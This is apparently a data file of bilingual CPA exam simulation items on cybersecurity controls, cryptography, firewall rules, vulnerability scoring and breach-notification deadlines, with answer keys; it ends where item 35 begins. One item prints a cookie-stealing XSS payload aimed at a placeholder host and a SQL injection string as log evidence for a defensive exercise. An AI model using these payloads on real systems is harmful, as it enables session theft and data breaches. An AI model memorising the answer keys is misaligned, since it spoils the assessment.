// ISC のTBS追加(NIST CSF 2.0・攻撃と軽減統制・暗号鍵・ファイアウォール・脆弱性優先順位・インシデント対応・プライバシー・アクセスレビュー)

CPA.tbs({
  id: "TBS-ISC-29", section: "ISC", chapter: "ISC-02", title: "NIST CSF 2.0の機能・カテゴリーへの統制の対応付け",
  scenario: `<p>Harlow Medical Supply, Inc. is aligning its control inventory with the <b>NIST Cybersecurity Framework (CSF) 2.0</b>. The CISO prepared the following excerpt and asks you to assign each control to the single most appropriate CSF 2.0 category.</p>
<p><b>Exhibit — Control inventory (excerpt)</b></p>
<table><tr><th>No.</th><th>Control description</th></tr>
<tr><td>C1</td><td>Before signing a contract, Procurement requires critical vendors to complete a security questionnaire and provide a SOC 2 Type 2 report; contracts include breach-notification and right-to-audit clauses.</td></tr>
<tr><td>C2</td><td>IT maintains a configuration management database (CMDB) listing all hardware, software, and data flows, with an owner and criticality rating for each item.</td></tr>
<tr><td>C3</td><td>Remote access to the ERP requires multifactor authentication, and access rights are granted on a least-privilege basis.</td></tr>
<tr><td>C4</td><td>A security operations center uses a SIEM to monitor network traffic and endpoint activity 24/7 for anomalous behavior.</td></tr>
<tr><td>C5</td><td>After an incident is contained, systems are restored from immutable backups in the sequence set by the recovery plan, and the integrity of restored data is verified before return to production.</td></tr>
<tr><td>C6</td><td>Lessons learned from incidents and annual tabletop exercises are documented and used to update the security program and response plans.</td></tr>
<tr><td>C7</td><td>The board's audit committee reviews quarterly results of the cybersecurity risk management strategy and directs adjustments when performance falls short.</td></tr></table>
<p class="ja">Harlow Medical Supply社は統制一覧を<b>NISTサイバーセキュリティ・フレームワーク(CSF)2.0</b>に整合させている。CISOが作成した抜粋(C1:重要ベンダーとの契約前にセキュリティ質問票とSOC 2 Type 2報告書を要求し、契約に侵害通知条項と監査権条項を入れる/C2:CMDBで全ハードウェア・ソフトウェア・データフローを所有者と重要度付きで管理/C3:ERPへのリモートアクセスに多要素認証を要求し、最小権限で権限付与/C4:SOCがSIEMでネットワークとエンドポイントを24時間365日監視/C5:封じ込め後、復旧計画の順序に従いイミュータブルバックアップから復元し、本番復帰前にデータの完全性を検証/C6:インシデントと年次机上演習の教訓を文書化し、プログラムと対応計画の更新に用いる/C7:取締役会の監査委員会がサイバーリスク管理戦略の結果を四半期ごとにレビューし、不十分な場合は修正を指示)について、最も適切なCSF 2.0のカテゴリーを1つ選べ。</p>`,
  rows: [
    { label: "C1(ベンダーのセキュリティ評価と契約条項)", type: "select", options: ["GV.SC Cybersecurity Supply Chain Risk Management", "ID.RA Risk Assessment", "PR.DS Data Security", "RS.CO Incident Response Reporting and Communication", "GV.PO Policy"], answer: "GV.SC Cybersecurity Supply Chain Risk Management" },
    { label: "C2(CMDBによる資産管理)", type: "select", options: ["PR.PS Platform Security", "ID.AM Asset Management", "GV.OC Organizational Context", "DE.CM Continuous Monitoring", "ID.RA Risk Assessment"], answer: "ID.AM Asset Management" },
    { label: "C3(多要素認証と最小権限)", type: "select", options: ["PR.AT Awareness and Training", "PR.AA Identity Management, Authentication, and Access Control", "PR.DS Data Security", "DE.AE Adverse Event Analysis", "GV.RR Roles, Responsibilities, and Authorities"], answer: "PR.AA Identity Management, Authentication, and Access Control" },
    { label: "C4(SIEMによる常時監視)", type: "select", options: ["DE.CM Continuous Monitoring", "RS.AN Incident Analysis", "PR.PS Platform Security", "ID.AM Asset Management", "RS.MA Incident Management"], answer: "DE.CM Continuous Monitoring" },
    { label: "C5(バックアップからの復元と完全性検証)", type: "select", options: ["RS.MI Incident Mitigation", "PR.IR Technology Infrastructure Resilience", "RC.RP Incident Recovery Plan Execution", "RC.CO Incident Recovery Communication", "PR.DS Data Security"], answer: "RC.RP Incident Recovery Plan Execution" },
    { label: "C6(教訓の文書化と計画の更新)", type: "select", options: ["ID.IM Improvement", "RS.AN Incident Analysis", "GV.OV Oversight", "RC.CO Incident Recovery Communication", "PR.AT Awareness and Training"], answer: "ID.IM Improvement" },
    { label: "C7(監査委員会による戦略結果のレビュー)", type: "select", options: ["GV.RM Risk Management Strategy", "GV.OV Oversight", "ID.RA Risk Assessment", "GV.OC Organizational Context", "DE.AE Adverse Event Analysis"], answer: "GV.OV Oversight" },
    { label: "Number of the seven controls that fall under the Govern (GV) function(7つの統制のうちガバナンス(GV)機能に属する数)", type: "num", answer: 2 },
  ],
  explain: `<p>CSF 2.0の6機能は Govern(統治)・Identify(識別)・Protect(防御)・Detect(検知)・Respond(対応)・Recover(復旧)である。</p>
<p>① C1:サプライヤーの評価や契約上のセキュリティ要求は、2.0で Govern に新設された GV.SC(サプライチェーン・リスク管理)に属する。</p>
<p>② C2:ハードウェア・ソフトウェア・データフローの棚卸と重要度付けは ID.AM(資産管理)である。</p>
<p>③ C3:認証(MFA)とアクセス権の付与・最小権限は PR.AA(ID管理・認証・アクセス制御)である。</p>
<p>④ C4:異常を見つけるための継続的な監視は DE.CM である。検知した事象の分析は DE.AE だが、本統制は監視そのものである。</p>
<p>⑤ C5:封じ込め後に復旧計画に従ってシステムを復元し、完全性を確認するのは RC.RP(復旧計画の実行)である。RS.MI は封じ込め・根絶であり段階が異なる。</p>
<p>⑥ C6:CSF 2.0では改善(Improvement)は Identify 機能の ID.IM に置かれた(1.1では Respond/Recover の各機能に Improvements があった)。</p>
<p>⑦ C7:リスク管理戦略の結果をレビューし調整するのは GV.OV(監督)である。リスク選好や戦略の策定自体は GV.RM である。</p>
<p>⑧ GVに属するのは C1(GV.SC)と C7(GV.OV)の2つ。</p>`,
});

CPA.tbs({
  id: "TBS-ISC-30", section: "ISC", chapter: "ISC-02", title: "インシデント記録の攻撃手法の特定と最適な軽減統制",
  scenario: `<p>Brightwater Logistics' security team logged four events during October 2026. For each event, identify the attack type and the control that would <b>most directly</b> prevent or mitigate it.</p>
<p><b>Exhibit 1 — Security event log (summarized)</b></p>
<table><tr><th>Event</th><th>Description</th></tr>
<tr><td>E1</td><td>An AP clerk received an email from "ceo@brightwater-logistcs.com" (note the misspelled domain) asking her to urgently change a supplier's bank account and release a $186,000 payment before the CEO's flight. The email contained no attachment or link.</td></tr>
<tr><td>E2</td><td>The customer portal's web server log shows the string <code>' OR '1'='1' --</code> submitted in the username field, followed by a response containing every customer record.</td></tr>
<tr><td>E3</td><td>The identity provider recorded 4,800 failed logins over six hours: each of 1,600 user accounts was tried with only the passwords "Autumn2026!", "Welcome1", and "Password123". Attempts came from rotating IP addresses, and no account reached the five-attempt lockout threshold.</td></tr>
<tr><td>E4</td><td>A product review submitted on the public website contained <code>&lt;script&gt;fetch('https://x.example/c?'+document.cookie)&lt;/script&gt;</code>. The review was saved and executed in the browsers of other visitors who viewed the page.</td></tr></table>
<p><b>Exhibit 2 — Candidate controls</b>: out-of-band verification of payment changes; parameterized queries with server-side input validation; context-aware output encoding with a content security policy; phishing-resistant multifactor authentication with risk-based login throttling; full-disk encryption; network segmentation.</p>
<p class="ja">Brightwater Logistics社のセキュリティチームは2026年10月に4件の事象を記録した。E1:買掛金担当者に綴りを誤ったドメインの「CEO」からメールが届き、搭乗前に至急、仕入先の銀行口座を変更して186,000ドルを支払うよう依頼された(添付もリンクもない)。E2:顧客ポータルのユーザー名欄に <code>' OR '1'='1' --</code> が入力され、全顧客レコードが返された。E3:6時間で4,800件のログイン失敗。1,600のアカウントそれぞれに3種類のよくあるパスワードのみが試され、IPアドレスは変動し、5回ロックアウトの閾値に達したアカウントはない。E4:公開サイトの製品レビューに cookie を外部送信するスクリプトが含まれ、保存されたうえ閲覧した他の訪問者のブラウザで実行された。各事象の攻撃手法と、最も直接的に防止・軽減する統制(Exhibit 2の候補)を選べ。</p>`,
  rows: [
    { label: "E1 — attack type(攻撃手法)", type: "select", options: ["Business email compromise (spoofed executive)", "SQL injection", "Stored cross-site scripting (XSS)", "Password spraying", "Credential stuffing", "Man-in-the-middle"], answer: "Business email compromise (spoofed executive)" },
    { label: "E1 — best control(最適な統制)", type: "select", options: ["Out-of-band verification of payment changes", "Parameterized queries with server-side input validation", "Context-aware output encoding with a content security policy", "Phishing-resistant MFA with risk-based login throttling", "Full-disk encryption", "Network segmentation"], answer: "Out-of-band verification of payment changes" },
    { label: "E2 — attack type(攻撃手法)", type: "select", options: ["Business email compromise (spoofed executive)", "SQL injection", "Stored cross-site scripting (XSS)", "Password spraying", "Credential stuffing", "Man-in-the-middle"], answer: "SQL injection" },
    { label: "E2 — best control(最適な統制)", type: "select", options: ["Out-of-band verification of payment changes", "Parameterized queries with server-side input validation", "Context-aware output encoding with a content security policy", "Phishing-resistant MFA with risk-based login throttling", "Full-disk encryption", "Network segmentation"], answer: "Parameterized queries with server-side input validation" },
    { label: "E3 — attack type(攻撃手法)", type: "select", options: ["Business email compromise (spoofed executive)", "SQL injection", "Stored cross-site scripting (XSS)", "Password spraying", "Credential stuffing", "Man-in-the-middle"], answer: "Password spraying" },
    { label: "E3 — best control(最適な統制)", type: "select", options: ["Out-of-band verification of payment changes", "Parameterized queries with server-side input validation", "Context-aware output encoding with a content security policy", "Phishing-resistant MFA with risk-based login throttling", "Full-disk encryption", "Network segmentation"], answer: "Phishing-resistant MFA with risk-based login throttling" },
    { label: "E4 — attack type(攻撃手法)", type: "select", options: ["Business email compromise (spoofed executive)", "SQL injection", "Stored cross-site scripting (XSS)", "Password spraying", "Credential stuffing", "Man-in-the-middle"], answer: "Stored cross-site scripting (XSS)" },
    { label: "E4 — best control(最適な統制)", type: "select", options: ["Out-of-band verification of payment changes", "Parameterized queries with server-side input validation", "Context-aware output encoding with a content security policy", "Phishing-resistant MFA with risk-based login throttling", "Full-disk encryption", "Network segmentation"], answer: "Context-aware output encoding with a content security policy" },
  ],
  explain: `<p>① E1:マルウェアもリンクもなく、類似ドメインで経営者になりすまし、急ぎの送金や口座変更を求める典型的なビジネスメール詐欺(BEC)である。技術的なフィルタをすり抜けるため、既知の連絡先への折り返し電話など、メールとは別経路での確認(アウト・オブ・バンド確認)が最も直接的な統制となる。</p>
<p>② E2:入力値がSQL文の一部として解釈され、WHERE句が常に真になって全件が返されている。SQLインジェクションである。入力をデータとして扱うパラメータ化クエリ(プリペアドステートメント)とサーバー側の入力検証が根本的な対策である。</p>
<p>③ E3:少数のよくあるパスワードを多数のアカウントに試し、アカウントあたりの試行回数をロックアウト閾値未満に抑えている。パスワードスプレーである。漏えいしたID・パスワードの組を使うクレデンシャルスタッフィングとは異なる。パスワードが当たっても侵入できないフィッシング耐性のあるMFAと、送信元・リスクに基づくログイン抑制が最適である。</p>
<p>④ E4:スクリプトがサーバーに保存され、閲覧者のブラウザで実行されている。格納型(持続型)XSSである。出力時の文脈に応じたエンコード(エスケープ)とコンテンツセキュリティポリシー(CSP)が直接の対策である。全ディスク暗号化やネットワーク分離はいずれの攻撃にも直接対応しない。</p>`,
});

CPA.tbs({
  id: "TBS-ISC-31", section: "ISC", chapter: "ISC-02", title: "電子署名とハイブリッド暗号で使われる鍵の特定",
  scenario: `<p>Ana Ruiz, treasurer of Corvane Co., must send a signed, confidential loan amendment to Ben Okafor, the lender's counsel, over the internet. Both parties hold X.509 certificates issued by a trusted certificate authority (CA). The company's secure-messaging tool follows these steps:</p>
<p><b>Exhibit 1 — Process</b></p>
<table><tr><th>Step</th><th>Action</th></tr>
<tr><td>1</td><td>Compute a SHA-256 hash of the document.</td></tr>
<tr><td>2</td><td>Encrypt the hash to create a digital signature.</td></tr>
<tr><td>3</td><td>Generate a random AES-256 session key and encrypt the document and signature with it.</td></tr>
<tr><td>4</td><td>Encrypt the session key so that only Ben can recover it.</td></tr>
<tr><td>5</td><td>Ben recovers the session key, decrypts the document, and verifies the signature.</td></tr></table>
<p><b>Exhibit 2 — Ben's verification result</b></p>
<table><tr><th>Item</th><th>Value (first 8 hex characters)</th></tr>
<tr><td>Hash recovered from Ana's signature</td><td>9f2c41ab…</td></tr>
<tr><td>Hash Ben computes on the decrypted document</td><td>9f2c41ae…</td></tr></table>
<p>Separately, Corvane's IT manager is comparing key management approaches for its <b>50</b> employees who exchange confidential files with one another.</p>
<p class="ja">Corvane社の財務担当Ana Ruizは、署名付きで機密の融資契約変更書を貸手の弁護士Ben Okaforにインターネット経由で送る。両者は信頼できる認証局(CA)発行のX.509証明書を持つ。手順は、1:文書のSHA-256ハッシュを計算、2:ハッシュを暗号化して電子署名を作成、3:ランダムなAES-256セッション鍵を生成し文書と署名を暗号化、4:Benだけが復元できるようセッション鍵を暗号化、5:Benがセッション鍵を復元し、文書を復号して署名を検証、である。Benの検証では、署名から復元したハッシュは 9f2c41ab…、復号した文書から計算したハッシュは 9f2c41ae… であった。別途、IT責任者は機密ファイルを相互にやり取りする従業員<b>50</b>名の鍵管理方式を比較している。</p>`,
  rows: [
    { label: "Key used in Step 2 to create the signature(手順2で署名作成に使う鍵)", type: "select", options: ["Ana's private key", "Ana's public key", "Ben's private key", "Ben's public key", "The AES session key"], answer: "Ana's private key" },
    { label: "Key used in Step 4 to encrypt the session key(手順4でセッション鍵の暗号化に使う鍵)", type: "select", options: ["Ana's private key", "Ana's public key", "Ben's private key", "Ben's public key", "The AES session key"], answer: "Ben's public key" },
    { label: "Key Ben uses to recover the session key(Benがセッション鍵の復元に使う鍵)", type: "select", options: ["Ana's private key", "Ana's public key", "Ben's private key", "Ben's public key", "The AES session key"], answer: "Ben's private key" },
    { label: "Key Ben uses to verify the signature(Benが署名の検証に使う鍵)", type: "select", options: ["Ana's private key", "Ana's public key", "Ben's private key", "Ben's public key", "The AES session key"], answer: "Ana's public key" },
    { label: "Conclusion from Exhibit 2(Exhibit 2からの結論)", type: "select", options: ["Signature is valid; the document is authentic and unaltered", "The document was altered after signing (or corrupted); reject it", "The document is authentic, but confidentiality was lost", "Ben used the wrong private key; the result is inconclusive"], answer: "The document was altered after signing (or corrupted); reject it" },
    { label: "Role of the CA in this process(このプロセスにおけるCAの役割)", type: "select", options: ["Holds escrow copies of each user's private key to decrypt messages", "Binds each public key to its owner's verified identity by signing a certificate", "Generates the AES session key for each message", "Computes the hash value used in the signature"], answer: "Binds each public key to its owner's verified identity by signing a certificate" },
    { label: "Unique keys needed if the 50 employees use only symmetric keys, one per pair(50名が対ごとに共通鍵のみを使う場合の鍵数)", type: "num", answer: 1225 },
    { label: "Keys needed if each of the 50 employees has an asymmetric key pair(50名が各自公開鍵ペアを持つ場合の鍵の総数)", type: "num", answer: 100 },
  ],
  explain: `<p>① 署名は送信者が自分の<b>秘密鍵</b>でハッシュを暗号化して作る。これにより送信者の認証と否認防止が得られる。</p>
<p>② セッション鍵は受信者の<b>公開鍵</b>で暗号化する。対応する秘密鍵を持つBenだけが復元できるため機密性が確保される(大量データは高速なAESで暗号化し、鍵の受け渡しだけ公開鍵暗号を使うハイブリッド方式)。</p>
<p>③ Benは自分の秘密鍵でセッション鍵を復号する。</p>
<p>④ 署名の検証には署名者Anaの公開鍵を使い、署名からハッシュを取り出す。</p>
<p>⑤ 取り出したハッシュ(…41ab)と再計算したハッシュ(…41ae)が一致しない。ハッシュはわずかな変更でも値が変わるため、署名後に文書が改ざん(または破損)されたことを示し、完全性が確認できない。受け入れずに再送を求める。</p>
<p>⑥ CAは本人確認を行ったうえで、公開鍵と所有者を結び付ける証明書に電子署名する。秘密鍵の預託やセッション鍵の生成は役割ではない。</p>
<p>⑦ 共通鍵方式では全ての組合せに鍵が必要:n(n−1)/2 = 50×49÷2 = 1,225。</p>
<p>⑧ 公開鍵方式では1人1ペア:2n = 2×50 = 100。</p>`,
});

CPA.tbs({
  id: "TBS-ISC-32", section: "ISC", chapter: "ISC-02", title: "ファイアウォールのルールセットのレビュー(許可・拒否の判定)",
  scenario: `<p>As part of an IT audit at Delmore Retail, you review the perimeter firewall rule set. The firewall is <b>stateful</b>, evaluates rules <b>top-down</b>, and applies the <b>first matching rule</b> only. Internal subnets: 10.1.5.0/24 = IT administrators; 10.2.0.0/16 = database zone; 203.0.113.0/24 = DMZ (web server 203.0.113.10).</p>
<p><b>Exhibit 1 — Rule set</b></p>
<table><tr><th>Rule</th><th>Action</th><th>Protocol</th><th>Source</th><th>Destination</th><th>Dest. port</th></tr>
<tr><td>1</td><td>Deny</td><td>Any</td><td>198.51.100.0/24 (threat-intel blocklist)</td><td>Any</td><td>Any</td></tr>
<tr><td>2</td><td>Allow</td><td>TCP</td><td>Any</td><td>203.0.113.10</td><td>443</td></tr>
<tr><td>3</td><td>Allow</td><td>TCP</td><td>Any</td><td>203.0.113.10</td><td>80</td></tr>
<tr><td>4</td><td>Allow</td><td>TCP</td><td>10.1.5.0/24</td><td>203.0.113.0/24</td><td>22</td></tr>
<tr><td>5</td><td>Allow</td><td>TCP</td><td>203.0.113.10</td><td>10.2.0.50</td><td>1433</td></tr>
<tr><td>6</td><td>Deny</td><td>Any</td><td>Any</td><td>10.2.0.0/16</td><td>Any</td></tr>
<tr><td>7</td><td>Allow</td><td>TCP</td><td>10.0.0.0/8</td><td>Any</td><td>443</td></tr>
<tr><td>8</td><td>Deny</td><td>Any</td><td>Any</td><td>Any</td><td>Any</td></tr></table>
<p><b>Exhibit 2 — Test packets (new connections)</b></p>
<table><tr><th>Packet</th><th>Source</th><th>Destination:port</th></tr>
<tr><td>P1</td><td>198.51.100.7</td><td>203.0.113.10:443</td></tr>
<tr><td>P2</td><td>192.0.2.44</td><td>203.0.113.10:443</td></tr>
<tr><td>P3</td><td>192.0.2.44</td><td>203.0.113.10:22</td></tr>
<tr><td>P4</td><td>203.0.113.10</td><td>10.2.0.50:1433</td></tr>
<tr><td>P5</td><td>192.0.2.44</td><td>10.2.0.50:1433</td></tr>
<tr><td>P6</td><td>10.1.5.23</td><td>203.0.113.10:22</td></tr>
<tr><td>P7</td><td>10.3.8.9</td><td>93.184.216.34:443</td></tr></table>
<p><b>Exhibit 3 — Change request</b>: To stop employees from uploading files to an unapproved file-sharing site (93.184.216.34), the network engineer proposes appending a new Rule 9: Deny TCP 10.0.0.0/8 → 93.184.216.34 port 443.</p>
<p class="ja">Delmore Retail社のIT監査で境界ファイアウォールのルールセットをレビューする。ファイアウォールは<b>ステートフル</b>で、ルールを<b>上から順に</b>評価し、<b>最初に一致したルール</b>のみを適用する。10.1.5.0/24はIT管理者、10.2.0.0/16はデータベースゾーン、203.0.113.0/24はDMZ(Webサーバーは203.0.113.10)である。ルールセットとテストパケットは英文の表のとおり。変更依頼(Exhibit 3):未承認のファイル共有サイト(93.184.216.34)へのアップロードを止めるため、ネットワーク技術者は末尾に新ルール9「Deny TCP 10.0.0.0/8 → 93.184.216.34 ポート443」を追加することを提案している。</p>`,
  rows: [
    { label: "P1 — rule number applied(P1に適用されるルール番号)", type: "num", answer: 1 },
    { label: "P2 — outcome(P2の結果)", type: "select", options: ["Allowed", "Denied"], answer: "Allowed" },
    { label: "P3 — rule number applied(P3に適用されるルール番号)", type: "num", answer: 8 },
    { label: "P4 — outcome(P4の結果)", type: "select", options: ["Allowed", "Denied"], answer: "Allowed" },
    { label: "P5 — rule number applied(P5に適用されるルール番号)", type: "num", answer: 6 },
    { label: "P6 — outcome(P6の結果)", type: "select", options: ["Allowed", "Denied"], answer: "Allowed" },
    { label: "Number of the seven packets that are allowed(7つのパケットのうち許可される数)", type: "num", answer: 4 },
    { label: "Evaluation of the proposed Rule 9(提案されたルール9の評価)", type: "select", options: ["Effective as proposed, because deny rules take precedence over allow rules", "Ineffective, because Rule 7 (and Rule 8) are matched first; it must be placed above Rule 7", "Ineffective, because a stateful firewall cannot filter outbound traffic", "Unnecessary, because Rule 6 already blocks the traffic"], answer: "Ineffective, because Rule 7 (and Rule 8) are matched first; it must be placed above Rule 7" },
  ],
  explain: `<p>① P1:送信元198.51.100.7はブロックリスト(198.51.100.0/24)に含まれ、宛先が許可対象のWebサーバーでも最初に一致するルール1で拒否される。</p>
<p>② P2:ルール1に該当せず、宛先203.0.113.10:443でルール2に一致し許可。</p>
<p>③ P3:SSH(22)を許可するルール4は送信元が管理者サブネットに限られる。外部の192.0.2.44はルール1〜7のいずれにも一致せず、ルール8(全拒否)で拒否される。</p>
<p>④ P4:WebサーバーからDBサーバーへの1433はルール5に一致し許可。ルール6の全拒否より上にあるため有効である。</p>
<p>⑤ P5:外部からDBへの直接接続はルール5(送信元がWebサーバー限定)に一致せず、ルール6で拒否。</p>
<p>⑥ P6:管理者サブネット10.1.5.23からDMZへのSSHはルール4に一致し許可。</p>
<p>⑦ P7:社内10.3.8.9から外部の443はルール7に一致し許可。許可は P2・P4・P6・P7 の4つ(拒否は P1・P3・P5)。</p>
<p>⑧ 先頭一致方式では、末尾に置いたルール9に到達する前に、対象通信はルール7で許可されてしまう(仮にそれがなくてもルール8で処理される)。ブロックするにはルール7より上に配置する必要がある。拒否ルールが自動的に優先されるわけではなく、ステートフルFWも送信方向を制御でき、ルール6はDBゾーン宛てのみが対象である。</p>`,
});

CPA.tbs({
  id: "TBS-ISC-33", section: "ISC", chapter: "ISC-02", title: "脆弱性スキャン結果の優先順位付けと是正投資のROSI",
  scenario: `<p>Fenwick Payments' quarterly vulnerability scan produced the findings below. Under the company's vulnerability management policy, each finding receives a <b>risk score = CVSS base score × asset criticality weight × exposure factor</b>.</p>
<p><b>Exhibit 1 — Scoring weights</b>: Criticality — High 3, Medium 2, Low 1. Exposure — Internet-facing 1.5, Internal 1.0, Isolated (no network connectivity) 0.5.</p>
<p><b>Exhibit 2 — Remediation SLAs</b>: risk score ≥ 20.0 → 15 days; 10.0–19.9 → 30 days; below 10.0 → 90 days.</p>
<p><b>Exhibit 3 — Scan findings</b></p>
<table><tr><th>ID</th><th>Asset</th><th>CVSS</th><th>Criticality</th><th>Exposure</th></tr>
<tr><td>V1</td><td>Payment web application server</td><td>9.8</td><td>High</td><td>Internet-facing</td></tr>
<tr><td>V2</td><td>Legacy test server (decommission pending)</td><td>9.1</td><td>Low</td><td>Isolated</td></tr>
<tr><td>V3</td><td>ERP database server</td><td>7.5</td><td>High</td><td>Internal</td></tr>
<tr><td>V4</td><td>HR laptops</td><td>5.3</td><td>Medium</td><td>Internal</td></tr>
<tr><td>V5</td><td>Marketing brochure website</td><td>4.0</td><td>Low</td><td>Internet-facing</td></tr></table>
<p><b>Exhibit 4 — Risk analysis for V1</b>: The payment platform is valued at $2,000,000. A successful exploit is expected to cause a loss of 40% of that value (exposure factor). Without remediation, the annualized rate of occurrence (ARO) is 0.25. A patch plus a web application firewall would cost $45,000 per year and reduce the ARO to 0.02.</p>
<p class="ja">Fenwick Payments社の四半期脆弱性スキャンの結果である。方針により、各指摘には<b>リスクスコア=CVSS基本値×資産重要度の重み×露出係数</b>を付す。重要度は高3・中2・低1、露出はインターネット公開1.5・内部1.0・隔離(ネットワーク接続なし)0.5。是正期限はスコア20.0以上は15日、10.0〜19.9は30日、10.0未満は90日。V1について、決済基盤の価値は2,000,000ドル、攻撃成功時の損失はその40%(エクスポージャー・ファクター)、是正しない場合の年間発生率(ARO)は0.25。パッチ適用とWAF導入の年間費用は45,000ドルで、AROは0.02に下がる。</p>`,
  rows: [
    { label: "Risk score of V1(V1のリスクスコア)", type: "num", answer: 44.1, tol: 0.05 },
    { label: "Risk score of V3(V3のリスクスコア)", type: "num", answer: 22.5, tol: 0.05 },
    { label: "Finding ranked second in remediation priority(是正優先順位が2位の指摘)", type: "select", options: ["V2", "V3", "V4", "V5"], answer: "V3" },
    { label: "Remediation SLA for V2(V2の是正期限)", type: "select", options: ["15 days", "30 days", "90 days"], answer: "90 days" },
    { label: "Remediation SLA for V4(V4の是正期限)", type: "select", options: ["15 days", "30 days", "90 days"], answer: "30 days" },
    { label: "Single loss expectancy for V1, $(V1の単一損失予測額)", type: "num", answer: 800000 },
    { label: "Annualized loss expectancy for V1 before remediation, $(是正前のV1の年間損失予測額)", type: "num", answer: 200000 },
    { label: "Return on security investment (ROSI) of the V1 remediation, %(V1是正のROSI、%)", type: "num", answer: 308.9, tol: 0.1 },
  ],
  explain: `<p>各スコア:V1 = 9.8×3×1.5 = 44.1、V2 = 9.1×1×0.5 = 4.55、V3 = 7.5×3×1.0 = 22.5、V4 = 5.3×2×1.0 = 10.6、V5 = 4.0×1×1.5 = 6.0。</p>
<p>① V1 = 44.1。② V3 = 22.5。</p>
<p>③ 順位は V1(44.1)> V3(22.5)> V4(10.6)> V5(6.0)> V2(4.55)。CVSSだけならV2(9.1)が2位だが、隔離された低重要度資産のため実質リスクは最も低い。2位はV3である。</p>
<p>④ V2は4.55で10.0未満のため90日。⑤ V4は10.6で10.0〜19.9のため30日。</p>
<p>⑥ SLE = 資産価値×EF = 2,000,000×40% = 800,000ドル。</p>
<p>⑦ ALE = SLE×ARO = 800,000×0.25 = 200,000ドル。</p>
<p>⑧ 対策後ALE = 800,000×0.02 = 16,000ドル。ROSI =(対策前ALE − 対策後ALE − 対策コスト)÷対策コスト =(200,000 − 16,000 − 45,000)÷45,000 = 139,000÷45,000 ≒ 3.089 → 308.9%。</p>`,
});

CPA.tbs({
  id: "TBS-ISC-34", section: "ISC", chapter: "ISC-02", title: "インシデント対応のタイムラインと侵害通知期限",
  scenario: `<p>Harbor Clinic is a HIPAA covered entity that also offers telehealth services to patients located in the EU (it is a controller under the GDPR). Assume Harbor Clinic is "aware" of the breach for GDPR purposes and "discovers" it for HIPAA purposes at the same moment.</p>
<p><b>Exhibit 1 — Incident timeline (2026)</b></p>
<table><tr><th>Date / time</th><th>Event</th></tr>
<tr><td>Mar 3, 02:10</td><td>Attacker logs in with phished credentials of a billing clerk (determined later by forensics)</td></tr>
<tr><td>Mar 17, 09:00</td><td>SIEM alert on unusual bulk export</td></tr>
<tr><td>Mar 17, 15:00</td><td>SOC confirms unauthorized access to patient records (breach discovered)</td></tr>
<tr><td>Mar 18</td><td>Affected file servers isolated from the network; attacker sessions terminated</td></tr>
<tr><td>Mar 20</td><td>Malware removed from servers; all compromised credentials reset</td></tr>
<tr><td>Mar 24</td><td>Systems restored from clean backups and returned to normal operation</td></tr>
<tr><td>Apr 2</td><td>Lessons-learned meeting held</td></tr></table>
<p><b>Exhibit 2 — Affected individuals</b>: Unsecured PHI of 2,520 patients was exfiltrated: 1,900 residents of State X, 500 residents of State Y, and 120 residents of EU member states.</p>
<p class="ja">Harbor ClinicはHIPAAの対象事業者であり、EU所在の患者にも遠隔医療を提供している(GDPR上の管理者)。GDPR上の「認識」とHIPAA上の「発見」は同時点とする。<br>証拠1(2026年):3月3日 2:10 フィッシングで得た請求担当者の認証情報で攻撃者がログイン(後のフォレンジックで判明)/3月17日 9:00 大量エクスポートのSIEMアラート/3月17日 15:00 SOCが患者記録への不正アクセスを確認(侵害の発見)/3月18日 影響を受けたファイルサーバーをネットワークから隔離、攻撃者のセッションを切断/3月20日 マルウェア除去、侵害された認証情報をすべてリセット/3月24日 クリーンなバックアップから復元し通常運用に復帰/4月2日 教訓(振り返り)会議。<br>証拠2:保護されていないPHI 2,520人分が流出した。内訳はX州住民1,900人、Y州住民500人、EU加盟国住民120人である。</p>`,
  rows: [
    { label: "Dwell time from initial access to discovery, in days(初期侵入から発見までの滞留日数)", type: "num", answer: 14 },
    { label: "Days from discovery to completion of recovery(発見から復旧完了までの日数)", type: "num", answer: 7 },
    { label: "NIST SP 800-61 phase of the March 20 actions(3月20日の対応のフェーズ)", type: "select", options: ["Detection and analysis", "Containment", "Eradication", "Recovery", "Post-incident activity"], answer: "Eradication" },
    { label: "GDPR deadline to notify the supervisory authority(GDPRの監督機関への通知期限)", type: "select", options: ["March 18, 2026, 15:00", "March 20, 2026, 15:00", "March 24, 2026, 15:00", "April 16, 2026"], answer: "March 20, 2026, 15:00" },
    { label: "Latest date for HIPAA notice to affected individuals(HIPAAの個人への通知の最終期限)", type: "select", options: ["April 16, 2026", "May 16, 2026", "May 23, 2026", "June 15, 2026"], answer: "May 16, 2026" },
    { label: "States requiring prominent media notice under HIPAA(HIPAAでメディア通知が必要な州)", type: "select", options: ["State X only", "State Y only", "Both State X and State Y", "Neither state"], answer: "State X only" },
    { label: "Timing of notice to the HHS Secretary(HHS長官への通知時期)", type: "select", options: ["Within 72 hours of discovery", "Without unreasonable delay and no later than 60 days after discovery", "In the annual log within 60 days after year-end", "Not required"], answer: "Without unreasonable delay and no later than 60 days after discovery" },
  ],
  explain: `<p>① 滞留時間(dwell time)は初期侵入(3月3日)から発見(3月17日)までで、17 − 3 = 14日である。SIEMアラート時点ではなく、侵入が始まった時点から数える。</p>
<p>② 発見(3月17日)から通常運用復帰(3月24日)まで 24 − 17 = 7日。</p>
<p>③ マルウェア除去と認証情報リセットは原因の除去であり「根絶(Eradication)」である。3月18日の隔離は封じ込め、3月24日の復元は復旧、4月2日の会議は事後活動に当たる。</p>
<p>④ GDPR第33条は、管理者が侵害を認識してから不当な遅滞なく、可能なら72時間以内に監督機関へ通知することを求める。3月17日15:00 + 72時間 = 3月20日15:00。</p>
<p>⑤ HIPAA侵害通知規則では、個人への通知は発見後不当な遅滞なく、遅くとも60暦日以内である。3月17日 + 60日:3月残り14日、4月30日で計44日、5月16日で60日 → 2026年5月16日。60日は上限であり、それまで待ってよいという意味ではない。</p>
<p>⑥ メディア通知は、ある州・管轄区域の住民で「500人を超える」侵害の場合に必要である。X州1,900人は該当、Y州はちょうど500人で「超える」に当たらないため不要。よってX州のみ。</p>
<p>⑦ 影響を受けた個人が合計500人以上(2,520人)のため、HHS長官へは個人通知と同時期に、発見後60日以内に通知する。500人未満なら年次の記録で暦年末後60日以内に報告すればよい。</p>`,
});

CPA.tbs({
  id: "TBS-ISC-35", section: "ISC", chapter: "ISC-02", title: "事例ごとのプライバシー・データ保護規制の適用判定",
